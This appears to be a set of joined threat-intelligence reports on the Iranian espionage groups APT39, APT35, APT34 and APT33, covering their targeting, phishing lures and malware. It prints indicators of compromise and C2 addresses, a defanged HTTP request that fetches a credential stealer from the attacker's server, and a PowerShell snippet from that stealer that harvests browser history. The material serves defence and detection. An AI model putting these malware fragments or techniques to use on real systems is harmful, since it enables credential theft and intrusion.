@@ -1,0 +1,1287 @@
+Written by: Sarah Hawley, Ben Read, Cristiana Brafman-Kittner, Nalani Fraser, Andrew Thompson, Yuri Rozhansky, Sanaz Yashar
+
+UPDATE (Jan. 30): Figure 1 has been updated to more accurately reflect APT39 targeting. Specifically, Australia, Norway and South Korea have been removed.
+
+In December 2018, FireEye identified APT39 as an Iranian cyber espionage group responsible for widespread theft of personal information. We have tracked activity linked to this group since November 2014 in order to protect organizations from APT39 activity to date. APT39’s focus on the widespread theft of personal information sets it apart from other Iranian groups FireEye tracks, which have been linked to influence operations, disruptive attacks, and other threats. APT39 likely focuses on personal information to support monitoring, tracking, or surveillance operations that serve Iran’s national priorities, or potentially to create additional accesses and vectors to facilitate future campaigns.
+
+APT39 was created to bring together previous activities and methods used by this actor, and its activities largely align with a group publicly referred to as "Chafer." However, there are differences in what has been publicly reported due to the variances in how organizations track activity. APT39 primarily leverages the SEAWEED and CACHEMONEY backdoors along with a specific variant of the POWBAT backdoor. While APT39's targeting scope is global, its activities are concentrated in the Middle East. APT39 has prioritized the telecommunications sector, with additional targeting of the travel industry and IT firms that support it and the high-tech industry. The countries and industries targeted by APT39 are depicted in Figure 1.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/APT39Fig1c_uqmc.max-800x800.jpg
+Figure 1: Countries and industries targeted by APT39
+
+Operational Intent
+APT39's focus on the telecommunications and travel industries suggests intent to perform monitoring, tracking, or surveillance operations against specific individuals, collect proprietary or customer data for commercial or operational purposes that serve strategic requirements related to national priorities, or create additional accesses and vectors to facilitate future campaigns. Government entities targeting suggests a potential secondary intent to collect geopolitical data that may benefit nation-state decision making. Targeting data supports the belief that APT39's key mission is to track or monitor targets of interest, collect personal information, including travel itineraries, and gather customer data from telecommunications firms.
+
+Iran Nexus Indicators
+We have moderate confidence APT39 operations are conducted in support of Iranian national interests based on regional targeting patterns focused in the Middle East, infrastructure, timing, and similarities to APT34, a group that loosely aligns with activity publicly reported as “OilRig”. While APT39 and APT34 share some similarities, including malware distribution methods, POWBAT backdoor use, infrastructure nomenclature, and targeting overlaps, we consider APT39 to be distinct from APT34 given its use of a different POWBAT variant. It is possible that these groups work together or share resources at some level.
+
+Attack Lifecycle
+APT39 uses a variety of custom and publicly available malware and tools at all stages of the attack lifecycle.
+
+Initial Compromise
+
+For initial compromise, FireEye Intelligence has observed APT39 leverage spear phishing emails with malicious attachments and/or hyperlinks typically resulting in a POWBAT infection. APT39 frequently registers and leverages domains that masquerade as legitimate web services and organizations that are relevant to the intended target. Furthermore, this group has routinely identified and exploited vulnerable web servers of targeted organizations to install web shells, such as ANTAK and ASPXSPY, and used stolen legitimate credentials to compromise externally facing Outlook Web Access (OWA) resources.
+
+Establish Foothold, Escalate Privileges, and Internal Reconnaissance
+
+Post-compromise, APT39 leverages custom backdoors such as SEAWEED, CACHEMONEY, and a unique variant of POWBAT to establish a foothold in a target environment. During privilege escalation, freely available tools such as Mimikatz and Ncrack have been observed, in addition to legitimate tools such as Windows Credential Editor and ProcDump. Internal reconnaissance has been performed using custom scripts and both freely available and custom tools such as the port scanner, BLUETORCH.
+
+Lateral Movement, Maintain Presence, and Complete Mission
+
+APT39 facilitates lateral movement through myriad tools such as Remote Desktop Protocol (RDP), Secure Shell (SSH), PsExec, RemCom, and xCmdSvc. Custom tools such as REDTRIP, PINKTRIP, and BLUETRIP have also been used to create SOCKS5 proxies between infected hosts. In addition to using RDP for lateral movement, APT39 has used this protocol to maintain persistence in a victim environment. To complete its mission, APT39 typically archives stolen data with compression tools such as WinRAR or 7-Zip.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/APT39Fig2_odvs.max-1000x1000.png
+Figure 2: APT39 attack lifecycle
+
+There are some indications that APT39 demonstrated a penchant for operational security to bypass detection efforts by network defenders, including the use of a modified version of Mimikatz that was repacked to thwart anti-virus detection in one case, as well as another instance when after gaining initial access APT39 performed credential harvesting outside of a compromised entity's environment to avoid detection.
+
+Outlook
+We believe APT39's significant targeting of the telecommunications and travel industries reflects efforts to collect personal information on targets of interest and customer data for the purposes of surveillance to facilitate future operations. Telecommunications firms are attractive targets given that they store large amounts of personal and customer information, provide access to critical infrastructure used for communications, and enable access to a wide range of potential targets across multiple verticals. APT39's targeting not only represents a threat to known targeted industries, but it extends to these organizations' clientele, which includes a wide variety of sectors and individuals on a global scale. APT39's activity showcases Iran's potential global operational reach and how it uses cyber operations as a low-cost and effective tool to facilitate the collection of key data on perceived national security threats and gain advantages against regional and global rivals.
+Target sectors: U.S. Western Europe, and Middle Eastern military, diplomatic, and government personnel, organizations in the media, energy, and defense Industrial base, and engineering, business services, and telecommunications sectors.
+
+Overview: APT35 (aka Newscaster Team) is an Iranian government-sponsored cyber espionage team that conducts long-term, resource-intensive operations to collect strategic intelligence. Mandiant Threat Intelligence has observed APT35 operations dating back to 2014. APT35 has historically relied on marginally sophisticated tools, including publicly available webshells and penetration testing tools, suggesting a relatively nascent development capability. However, the breadth and scope of APT35's operations, particularly as it relates to its complex social engineering efforts, likely indicates that the group is well resourced in other areas.
+
+Associated malware: ASPXSHELLSV, BROKEYOLK, PUPYRAT, TUNNA, MANGOPUNCH, DRUBOT, HOUSEBLEND
+
+Attack vectors: APT35 typically relies on spearphishing to initially compromise an organization, often using lures related to health care, job postings, resumes, or password policies. However, we have also observed the group using compromised accounts with credentials harvested from prior operations, strategic web compromises, and password spray attacks against externally facing web applications as additional techniques to gain initial access.
+Background
+With increasing geopolitical tensions in the Middle East, we expect Iran to significantly increase the volume and scope of its cyber espionage campaigns. Iran has a critical need for strategic intelligence and is likely to fill this gap by conducting espionage against decision makers and key organizations that may have information that furthers Iran's economic and national security goals. The identification of new malware and the creation of additional infrastructure to enable such campaigns highlights the increased tempo of these operations in support of Iranian interests.
+
+FireEye Identifies Phishing Campaign
+In late June 2019, FireEye identified a phishing campaign conducted by APT34, an Iranian-nexus threat actor. Three key attributes caught our eye with this particular campaign:
+
+Masquerading as a member of Cambridge University to gain victims’ trust to open malicious documents,
+The usage of LinkedIn to deliver malicious documents,
+The addition of three new malware families to APT34’s arsenal.
+FireEye’s platform successfully thwarted this attempted intrusion, stopping a new malware variant dead in its tracks. Additionally, with the assistance of our FireEye Labs Advanced Reverse Engineering (FLARE), Intelligence, and Advanced Practices teams, we identified three new malware families and a reappearance of PICKPOCKET, malware exclusively observed in use by APT34. The new malware families, which we will examine later in this post, show APT34 relying on their PowerShell development capabilities, as well as trying their hand at Golang.
+
+APT34 is an Iran-nexus cluster of cyber espionage activity that has been active since at least 2014. They use a mix of public and non-public tools to collect strategic information that would benefit nation-state interests pertaining to geopolitical and economic needs. APT34 aligns with elements of activity reported as OilRig and Greenbug, by various security researchers. This threat group has conducted broad targeting across a variety of industries operating in the Middle East; however, we believe APT34's strongest interest is gaining access to financial, energy, and government entities.
+
+Additional research on APT34 can be found in this FireEye blog post, this CERT-OPMD post, and this Cisco post.
+
+Mandiant Managed Defense also initiated a Community Protection Event (CPE) titled “Geopolitical Spotlight: Iran.” This CPE was created to ensure our customers are updated with new discoveries, activity and detection efforts related to this campaign, along with other recent activity from Iranian-nexus threat actors to include APT33, which is mentioned in this updated FireEye blog post.
+
+Industries Targeted
+The activities observed by Managed Defense, and described in this post, were primarily targeting the following industries:
+
+Energy and Utilities
+Government
+Oil and Gas
+Utilizing Cambridge University to Establish Trust
+On June 19, 2019, Mandiant Managed Defense Security Operations Center received an exploit detection alert on one of our FireEye Endpoint Security appliances. The offending application was identified as Microsoft Excel and was stopped immediately by FireEye Endpoint Security’s ExploitGuard engine. ExploitGuard is our behavioral monitoring, detection, and prevention capability that monitors application behavior, looking for various anomalies that threat actors use to subvert traditional detection mechanisms. Offending applications can subsequently be sandboxed or terminated, preventing an exploit from reaching its next programmed step.
+
+The Managed Defense SOC analyzed the alert and identified a malicious file named System.doc (MD5: b338baa673ac007d7af54075ea69660b), located in C:\Users\\.templates. The file System.doc is a Windows Portable Executable (PE), despite having a "doc" file extension. FireEye identified this new malware family as TONEDEAF.
+
+A backdoor that communicates with a single command and control (C2) server using HTTP GET and POST requests, TONEDEAF supports collecting system information, uploading and downloading of files, and arbitrary shell command execution. When executed, this variant of TONEDEAF wrote encrypted data to two temporary files – temp.txt and temp2.txt – within the same directory of its execution. We explore additional technical details of TONEDEAF in the malware appendix of this post.
+
+Retracing the steps preceding exploit detection, FireEye identified that System.doc was dropped by a file named ERFT-Details.xls. Combining endpoint- and network-visibility, we were able to correlate that ERFT-Details.xls originated from the URL http://www.cam-research-ac[.]com/Documents/ERFT-Details.xls. Network evidence also showed the access of a LinkedIn message directly preceding the spreadsheet download.
+
+Managed Defense reached out to the impacted customer’s security team, who confirmed the file was received via a LinkedIn message. The targeted employee conversed with "Rebecca Watts", allegedly employed as "Research Staff at University of Cambridge". The conversation with Ms. Watts, provided in Figure 1, began with the solicitation of resumes for potential job opportunities.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/hardpass1.max-800x800.png
+Figure 1: Screenshot of LinkedIn message asking to download TONEDEAF
+
+This is not the first time we’ve seen APT34 utilize academia and/or job offer conversations in their various campaigns. These conversations often take place on social media platforms, which can be an effective delivery mechanism if a targeted organization is focusing heavily on e-mail defenses to prevent intrusions.
+
+FireEye examined the original file ERFT-Details.xls, which was observed with at least two unique MD5 file hashes:
+
+96feed478c347d4b95a8224de26a1b2c
+caf418cbf6a9c4e93e79d4714d5d3b87
+A snippet of the VBA code, provided in Figure 2, creates System.doc in the target directory from base64-encoded text upon opening.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/hardpass2_spjm.max-1000x1000.max-1000x1000.png
+Figure 2: Screenshot of VBA code from System.doc
+
+The spreadsheet also creates a scheduled task named "windows update check" that runs the file C:\Users\\.templates\System Manager.exe every minute. Upon closing the spreadsheet, a final VBA function will rename System.doc to System Manager.exe. Figure 3 provides a snippet of VBA code that creates the scheduled task, clearly obfuscated to avoid simple detection.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/hardpass3_5fCmw6B.max-1000x1000.png
+Figure 3: Additional VBA code from System.doc
+
+Upon first execution of TONEDEAF, FireEye identified a callback to the C2 server offlineearthquake[.]com over port 80.
+
+The FireEye Footprint: Pivots and Victim Identification
+After identifying the usage of offlineearthquake[.]com as a potential C2 domain, FireEye’s Intelligence and Advanced Practices teams performed a wider search across our global visibility. FireEye’s Advanced Practices and Intelligence teams were able to identify additional artifacts and activity from the APT34 actors at other victim organizations. Of note, FireEye discovered two additional new malware families hosted at this domain, VALUEVAULT and LONGWATCH. We also identified a variant of PICKPOCKET, a browser credential-theft tool FireEye has been tracking since May 2018, hosted on the C2.
+
+Requests to the domain offlineearthquake[.]com could take multiple forms, depending on the malware’s stage of installation and purpose. Additionally, during installation, the malware retrieves the system and current user names, which are used to create a three-character “sys_id”. This value is used in subsequent requests, likely to track infected target activity. URLs were observed with the following structures:
+
+hxxp[://]offlineearthquake[.]com/download?id=&n=000
+hxxp[://]offlineearthquake[.]com/upload?id=&n=000
+hxxp[://]offlineearthquake[.]com/file//?id=&h=000
+hxxp[://]offlineearthquake[.]com/file//?id=&n=000
+The first executable identified by FireEye on the C2 was WinNTProgram.exe (MD5: 021a0f57fe09116a43c27e5133a57a0a), identified by FireEye as LONGWATCH. LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Window’s temp folder. Further information regarding LONGWATCH is detailed in the Malware Appendix section at the end of the post.
+
+FireEye Network Security appliances also detected the following being retrieved from APT34 infrastructure (Figure 4).
+
+ 
+
+GET hxxp://offlineearthquake.com/file/<sys_id>/b.exe?id=<3char_redacted>&n=000
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0)
+AppleWebKit/537.36 (KHTML, like Gecko)
+Host: offlineearthquake[.]com
+Proxy-Connection: Keep-Alive Pragma: no-cache HTTP/1.1
+Figure 4: Snippet of HTTP traffic retrieving VALUEVAULT; detected by FireEye Network Security appliance
+
+FireEye identifies b.exe (MD5: 9fff498b78d9498b33e08b892148135f) as VALUEVAULT.
+
+VALUEVAULT is a Golang compiled version of the "Windows Vault Password Dumper" browser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel.
+
+VALUEVAULT maintains the same functionality as the original tool by allowing the operator to extract and view the credentials stored in the Windows Vault. Additionally, VALUEVAULT will call Windows PowerShell to extract browser history in order to match browser passwords with visited sites. Further information regarding VALUEVAULT can be found in the appendix below.
+
+Further pivoting from FireEye appliances and internal data sources yielded two additional files, PE86.dll (MD5: d8abe843db508048b4d4db748f92a103) and PE64.dll (MD5: 6eca9c2b7cf12c247032aae28419319e). These files were analyzed and determined to be 64- and 32-bit variants of the malware PICKPOCKET, respectively.
+
+PICKPOCKET is a credential theft tool that dumps the user's website login credentials from Chrome, Firefox, and Internet Explorer to a file. This tool was previously observed during a Mandiant incident response in 2018 and, to date, solely utilized by APT34.
+
+Conclusion
+The activity described in this blog post presented a well-known Iranian threat actor utilizing their tried-and-true techniques to breach targeted organizations. Luckily, with FireEye’s platform in place, our Managed Defense customers were not impacted. Furthermore, upon the blocking of this activity, FireEye was able to expand upon the observed indicators to identify a broader campaign, as well as the use of new and old malware.
+
+We suspect this will not be the last time APT34 brings new tools to the table. Threat actors are often reshaping their TTPs to evade detection mechanisms, especially if the target is highly desired. For these reasons, we recommend organizations remain vigilant in their defenses, and remember to view their environment holistically when it comes to information security.
+
+Learn more about Mandiant Managed Defense, and catch an on-demand recap on this and the Top 5 Managed Defense attacks this year.
+
+Malware Appendix
+TONEDEAF
+TONEDEAF is a backdoor that communicates with Command and Control servers using HTTP or DNS. Supported commands include system information collection, file upload, file download, and arbitrary shell command execution. Although this backdoor was coded to be able to communicate with DNS requests to the hard-coded Command and Control server, c[.]cdn-edge-akamai[.]com, it was not configured to use this functionality. Figure 5 provides a snippet of the assembly CALL instruction of dns_exfil. The creator likely made this as a means for future DNS exfiltration as a plan B.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/hardpass5.max-800x800.png
+Figure 5: Snippet of code from TONEDEAF binary
+
+Aside from not being enabled in this sample, the DNS tunneling functionality also contains missing values and bugs that prevent it from executing properly. One such bug involves determining the length of a command response string without accounting for Unicode strings. As a result, a single command response byte is sent when, for example, the malware executes a shell command that returns Unicode output. Additionally, within the malware, an unused string contained the address 185[.]15[.]247[.]154.
+
+VALUEVAULT
+VALUEVAULT is a Golang compiled version of the “Windows Vault Password Dumper” browser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel.
+
+VALUEVAULT maintains the same functionality as the original tool by allowing the operator to extract and view the credentials stored in the Windows Vault. Additionally, VALUEVAULT will call Windows PowerShell to extract browser history in order to match browser passwords with visited sites. A snippet of this function is shown in Figure 6.
+
+ 
+
+powershell.exe /c "function get-iehistory {. [CmdletBinding()]. param (). . $shell = New-Object -ComObject Shell.Application. $hist = $shell.NameSpace(34). $folder = $hist.Self. . $hist.Items() | . foreach {. if ($_.IsFolder) {. $siteFolder = $_.GetFolder. $siteFolder.Items() | . foreach {. $site = $_. . if ($site.IsFolder) {. $pageFolder = $site.GetFolder. $pageFolder.Items() | . foreach {. $visit = New-Object -TypeName PSObject -Property @{ . URL = $($pageFolder.GetDetailsOf($_,0)) . }. $visit. }. }. }. }. }. }. get-iehistory
+Figure 6: Snippet of PowerShell code from VALUEVAULT to extract browser credentials
+
+Upon execution, VALUEVAULT creates a SQLITE database file in the AppData\Roaming directory under the context of the user account it was executed by. This file is named fsociety.dat and VALUEVAULT will write the dumped passwords to this in SQL format. This functionality is not in the original version of the “Windows Vault Password Dumper”. Figure 7 shows the SQL format of the fsociety.dat file.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/hardpass7.max-1000x1000.png
+Figure 7: SQL format of the VALUEVAULT fsociety.dat SQLite database
+
+VALUEVAULT’s function names are not obfuscated and are directly reviewable in strings analysis. Other developer environment variables were directly available within the binary as shown below. VALUEVAULT does not possess the ability to perform network communication, meaning the operators would need to manually retrieve the captured output of the tool.
+
+ 
+
+C:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/new_edge.go
+C:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/mozila.go
+C:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/main.go
+C:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/ie.go
+C:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/Chrome Password Recovery.go
+Figure 8: Golang files extracted during execution of VALUEVAULT
+
+LONGWATCH
+FireEye identified the binary WinNTProgram.exe (MD5:021a0f57fe09116a43c27e5133a57a0a) hosted on the malicious domain offlineearthquake[.]com. FireEye identifies this malware as LONGWATCH. The primary function of LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Windows temp folder.
+
+Interesting strings identified in the binary are shown in Figure 9.
+
+ 
+
+GetAsyncKeyState
+>---------------------------------------------------\n\n
+c:\\windows\\temp\\log.txt
+[ENTER]
+[CapsLock]
+[CRTL]
+[PAGE_UP]
+[PAGE_DOWN]
+[HOME]
+[LEFT]
+[RIGHT]
+[DOWN]
+[PRINT]
+[PRINT SCREEN] (1 space)
+[INSERT]
+[SLEEP]
+[PAUSE]
+\n---------------CLIPBOARD------------\n
+\n\n >>>  (2 spaces)
+c:\\windows\\temp\\log.txt
+Figure 9: Strings identified in a LONGWATCH binary
+
+Detecting the Techniques
+FireEye detects this activity across our platforms, including named detection for TONEDEAF, VALUEVAULT, and LONGWATCH. Table 2 contains several specific detection names that provide an indication of APT34 activity.
+
+ 
+
+Signature Name
+FE_APT_Keylogger_Win_LONGWATCH_1
+FE_APT_Keylogger_Win_LONGWATCH_2
+FE_APT_Keylogger_Win32_LONGWATCH_1
+FE_APT_HackTool_Win_PICKPOCKET_1
+FE_APT_Trojan_Win32_VALUEVAULT_1
+FE_APT_Backdoor_Win32_TONEDEAF
+TONEDEAF BACKDOOR [DNS]
+TONEDEAF BACKDOOR [upload]
+TONEDEAF BACKDOOR [URI]
+Table 1: FireEye Platform Detections
+
+Endpoint Indicators
+Indicator	MD5 Hash (if applicable)	Code Family
+System.doc	b338baa673ac007d7af54075ea69660b	TONEDEAF
+ 	50fb09d53c856dcd0782e1470eaeae35	TONEDEAF
+ERFT-Details.xls	96feed478c347d4b95a8224de26a1b2c	TONEDEAF DROPPER
+ 	caf418cbf6a9c4e93e79d4714d5d3b87	TONEDEAF DROPPER
+b.exe	9fff498b78d9498b33e08b892148135f	VALUEVAULT
+WindowsNTProgram.exe	021a0f57fe09116a43c27e5133a57a0a	LONGWATCH
+PE86.dll	d8abe843db508048b4d4db748f92a103	PICKPOCKET
+PE64.dll	6eca9c2b7cf12c247032aae28419319e	PICKPOCKET
+Table 2: APT34 Endpoint Indicators from this blog post
+
+Network Indicators
+hxxp[://]www[.]cam-research-ac[.]com
+
+offlineearthquake[.]com
+
+c[.]cdn-edge-akamai[.]com
+
+185[.]15[.]247[.]154
+
+Acknowledgements
+A huge thanks to Delyan Vasilev and Alex Lanstein for their efforts in detecting, analyzing and classifying this APT34 campaign. Thanks to Matt Williams, Carlos Garcia and Matt Haigh from the FLARE team for the in-depth malware analysis.
+Written by: Jacqueline O'Leary, Josiah Kimble, Kelli Vanderlee, Nalani Fraser
+
+When discussing suspected Middle Eastern hacker groups with destructive capabilities, many automatically think of the suspected Iranian group that previously used SHAMOON – aka Disttrack – to target organizations in the Persian Gulf. However, over the past few years, we have been tracking a separate, less widely known suspected Iranian group with potential destructive capabilities, whom we call APT33. Our analysis reveals that APT33 is a capable group that has carried out cyber espionage operations since at least 2013. We assess APT33 works at the behest of the Iranian government.
+
+Recent investigations by FireEye’s Mandiant incident response consultants combined with FireEye iSIGHT Threat Intelligence analysis have given us a more complete picture of APT33’s operations, capabilities, and potential motivations. This blog highlights some of our analysis. Our detailed report on FireEye Threat Intelligence contains a more thorough review of our supporting evidence and analysis. We will also be discussing this threat group further during our webinar on Sept. 21 at 8 a.m. ET.
+
+Targeting
+APT33 has targeted organizations – spanning multiple industries – headquartered in the United States, Saudi Arabia and South Korea. APT33 has shown particular interest in organizations in the aviation sector involved in both military and commercial capacities, as well as organizations in the energy sector with ties to petrochemical production.
+
+From mid-2016 through early 2017, APT33 compromised a U.S. organization in the aerospace sector and targeted a business conglomerate located in Saudi Arabia with aviation holdings.
+
+During the same time period, APT33 also targeted a South Korean company involved in oil refining and petrochemicals. More recently, in May 2017, APT33 appeared to target a Saudi organization and a South Korean business conglomerate using a malicious file that attempted to entice victims with job vacancies for a Saudi Arabian petrochemical company.
+
+We assess the targeting of multiple companies with aviation-related partnerships to Saudi Arabia indicates that APT33 may possibly be looking to gain insights on Saudi Arabia’s military aviation capabilities to enhance Iran’s domestic aviation capabilities or to support Iran’s military and strategic decision making vis a vis Saudi Arabia.
+
+We believe the targeting of the Saudi organization may have been an attempt to gain insight into regional rivals, while the targeting of South Korean companies may be due to South Korea’s recent partnerships with Iran’s petrochemical industry as well as South Korea’s relationships with Saudi petrochemical companies. Iran has expressed interest in growing their petrochemical industry and often posited this expansion in competition to Saudi petrochemical companies. APT33 may have targeted these organizations as a result of Iran’s desire to expand its own petrochemical production and improve its competitiveness within the region.
+
+The generalized targeting of organizations involved in energy and petrochemicals mirrors previously observed targeting by other suspected Iranian threat groups, indicating a common interest in the sectors across Iranian actors.
+
+Figure 1 shows the global scope of APT33 targeting.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt33-espionage1_qzru.max-800x800.jpg
+Figure 1: Scope of APT33 Targeting
+
+Spear Phishing
+APT33 sent spear phishing emails to employees whose jobs related to the aviation industry. These emails included recruitment themed lures and contained links to malicious HTML application (.hta) files. The .hta files contained job descriptions and links to legitimate job postings on popular employment websites that would be relevant to the targeted individuals.
+
+An example .hta file excerpt is provided in Figure 2. To the user, the file would appear as benign references to legitimate job postings; however, unbeknownst to the user, the .hta file also contained embedded code that automatically downloaded a custom APT33 backdoor.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt33-espionage2_igns.max-1500x1500.png
+Figure 2: Excerpt of an APT33 malicious .hta file
+
+We assess APT33 used a built-in phishing module within the publicly available ALFA TEaM Shell (aka ALFASHELL) to send hundreds of spear phishing emails to targeted individuals in 2016. Many of the phishing emails appeared legitimate – they referenced a specific job opportunity and salary, provided a link to the spoofed company’s employment website, and even included the spoofed company’s Equal Opportunity hiring statement. However, in a few cases, APT33 operators left in the default values of the shell’s phishing module. These appear to be mistakes, as minutes after sending the emails with the default values, APT33 sent emails to the same recipients with the default values removed.
+
+As shown in Figure 3, the “fake mail” phishing module in the ALFA Shell contains default values, including the sender email address (solevisible@gmail[.]com), subject line (“your site hacked by me”), and email body (“Hi Dear Admin”).
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt33-espionage3_yotg.max-2200x2200.png
+Figure 3: ALFA TEaM Shell v2-Fake Mail (Default)
+
+Figure 4 shows an example email containing the default values the shell.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt33-espionage4.max-800x800.png
+Figure 4: Example Email Generated by the ALFA Shell with Default Values
+
+Domain Masquerading
+APT33 registered multiple domains that masquerade as Saudi Arabian aviation companies and Western organizations that together have partnerships to provide training, maintenance and support for Saudi’s military and commercial fleet. Based on observed targeting patterns, APT33 likely used these domains in spear phishing emails to target victim organizations.
+
+The following domains masquerade as these organizations: Boeing, Alsalam Aircraft Company, Northrop Grumman Aviation Arabia (NGAAKSA), and Vinnell Arabia.
+
+ 
+
+boeing.servehttp[.]com
+alsalam.ddns[.]net
+ngaaksa.ddns[.]net
+ngaaksa.sytes[.]net
+vinnellarabia.myftp[.]org
+Boeing, Alsalam Aircraft company, and Saudia Aerospace Engineering Industries entered into a joint venture to create the Saudi Rotorcraft Support Center in Saudi Arabia in 2015 with the goal of servicing Saudi Arabia’s rotorcraft fleet and building a self-sustaining workforce in the Saudi aerospace supply base.
+
+Alsalam Aircraft Company also offers military and commercial maintenance, technical support, and interior design and refurbishment services.
+
+Two of the domains appeared to mimic Northrop Grumman joint ventures. These joint ventures – Vinnell Arabia and Northrop Grumman Aviation Arabia – provide aviation support in the Middle East, specifically in Saudi Arabia. Both Vinnell Arabia and Northrop Grumman Aviation Arabia have been involved in contracts to train Saudi Arabia’s Ministry of National Guard.
+
+Identified Persona Linked to Iranian Government
+We identified APT33 malware tied to an Iranian persona who may have been employed by the Iranian government to conduct cyber threat activity against its adversaries.
+
+We assess an actor using the handle “xman_1365_x” may have been involved in the development and potential use of APT33’s TURNEDUP backdoor due to the inclusion of the handle in the processing-debugging (PDB) paths of many of TURNEDUP samples. An example can be seen in Figure 5.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt33-espionage5.max-800x800.png
+Figure 5: “xman_1365_x" PDB String in TURNEDUP Sample
+
+Xman_1365_x was also a community manager in the Barnamenevis Iranian programming and software engineering forum, and registered accounts in the well-known Iranian Shabgard and Ashiyane forums, though we did not find evidence to suggest that this actor was ever a formal member of the Shabgard or Ashiyane hacktivist groups.
+
+Open source reporting links the “xman_1365_x” actor to the “Nasr Institute,” which is purported to be equivalent to Iran’s “cyber army” and controlled by the Iranian government. Separately, additional evidence ties the “Nasr Institute” to the 2011-2013 attacks on the financial industry, a series of denial of service attacks dubbed Operation Ababil. In March 2016, the U.S. Department of Justice unsealed an indictment that named two individuals allegedly hired by the Iranian government to build attack infrastructure and conduct distributed denial of service attacks in support of Operation Ababil. While the individuals and the activity described in indictment are different than what is discussed in this report, it provides some evidence that individuals associated with the “Nasr Institute” may have ties to the Iranian government.
+
+Potential Ties to Destructive Capabilities and Comparisons with SHAMOON
+One of the droppers used by APT33, which we refer to as DROPSHOT, has been linked to the wiper malware SHAPESHIFT. Open source research indicates SHAPESHIFT may have been used to target organizations in Saudi Arabia.
+
+Although we have only directly observed APT33 use DROPSHOT to deliver the TURNEDUP backdoor, we have identified multiple DROPSHOT samples in the wild that drop SHAPESHIFT. The SHAPESHIFT malware is capable of wiping disks, erasing volumes and deleting files, depending on its configuration. Both DROPSHOT and SHAPESHIFT contain Farsi language artifacts, which indicates they may have been developed by a Farsi language speaker (Farsi is the predominant and official language of Iran).
+
+While we have not directly observed APT33 use SHAPESHIFT or otherwise carry out destructive operations, APT33 is the only group that we have observed use the DROPSHOT dropper. It is possible that DROPSHOT may be shared amongst Iran-based threat groups, but we do not have any evidence that this is the case.
+
+In March 2017, Kasperksy released a report that compared DROPSHOT (which they call Stonedrill) with the most recent variant of SHAMOON (referred to as Shamoon 2.0). They stated that both wipers employ anti-emulation techniques and were used to target organizations in Saudi Arabia, but also mentioned several differences. For example, they stated DROPSHOT uses more advanced anti-emulation techniques, utilizes external scripts for self-deletion, and uses memory injection versus external drivers for deployment. Kaspersky also noted the difference in resource language sections: SHAMOON embeds Arabic-Yemen language resources while DROPSHOT embeds Farsi (Persian) language resources.
+
+We have also observed differences in both targeting and tactics, techniques and procedures (TTPs) associated with the group using SHAMOON and APT33. For example, we have observed SHAMOON being used to target government organizations in the Middle East, whereas APT33 has targeted several commercial organizations both in the Middle East and globally. APT33 has also utilized a wide range of custom and publicly available tools during their operations. In contrast, we have not observed the full lifecycle of operations associated with SHAMOON, in part due to the wiper removing artifacts of the earlier stages of the attack lifecycle.
+
+Regardless of whether DROPSHOT is exclusive to APT33, both the malware and the threat activity appear to be distinct from the group using SHAMOON. Therefore, we assess there may be multiple Iran-based threat groups capable of carrying out destructive operations.
+
+Additional Ties Bolster Attribution to Iran
+APT33’s targeting of organizations involved in aerospace and energy most closely aligns with nation-state interests, implying that the threat actor is most likely government sponsored. This coupled with the timing of operations – which coincides with Iranian working hours – and the use of multiple Iranian hacker tools and name servers bolsters our assessment that APT33 may have operated on behalf of the Iranian government.
+
+The times of day that APT33 threat actors were active suggests that they were operating in a time zone close to 04:30 hours ahead of Coordinated Universal Time (UTC). The time of the observed attacker activity coincides with Iran’s Daylight Time, which is +0430 UTC.
+
+APT33 largely operated on days that correspond to Iran’s workweek, Saturday to Wednesday. This is evident by the lack of attacker activity on Thursday, as shown in Figure 6. Public sources report that Iran works a Saturday to Wednesday or Saturday to Thursday work week, with government offices closed on Thursday and some private businesses operating on a half day schedule on Thursday. Many other Middle East countries have elected to have a Friday and Saturday weekend.Iran is one of few countries that subscribes to a Saturday to Wednesday workweek.
+
+APT33 leverages popular Iranian hacker tools and DNS servers used by other suspected Iranian threat groups. The publicly available backdoors and tools utilized by APT33 – including NANOCORE, NETWIRE, and ALFA Shell – are all available on Iranian hacking websites, associated with Iranian hackers, and used by other suspected Iranian threat groups. While not conclusive by itself, the use of publicly available Iranian hacking tools and popular Iranian hosting companies may be a result of APT33’s familiarity with them and lends support to the assessment that APT33 may be based in Iran.
+
+https://storage.googleapis.com/gweb-cloudblog-publish/images/apt33-espionage6_dmsi.max-600x600.png
+Figure 6: APT33 Interactive Commands by Day of Week
+
+Outlook and Implications
+Based on observed targeting, we believe APT33 engages in strategic espionage by targeting geographically diverse organizations across multiple industries. Specifically, the targeting of organizations in the aerospace and energy sectors indicates that the threat group is likely in search of strategic intelligence capable of benefitting a government or military sponsor. APT33’s focus on aviation may indicate the group’s desire to gain insight into regional military aviation capabilities to enhance Iran’s aviation capabilities or to support Iran’s military and strategic decision making. Their targeting of multiple holding companies and organizations in the energy sectors align with Iranian national priorities for growth, especially as it relates to increasing petrochemical production. We expect APT33 activity will continue to cover a broad scope of targeted entities, and may spread into other regions and sectors as Iranian interests dictate.
+
+APT33’s use of multiple custom backdoors suggests that they have access to some of their own development resources, with which they can support their operations, while also making use of publicly available tools. The ties to SHAPESHIFT may suggest that APT33 engages in destructive operations or that they share tools or a developer with another Iran-based threat group that conducts destructive operations.
+
+Appendix
+Malware Family Descriptions
+ 
+
+Malware Family	Description	Availability
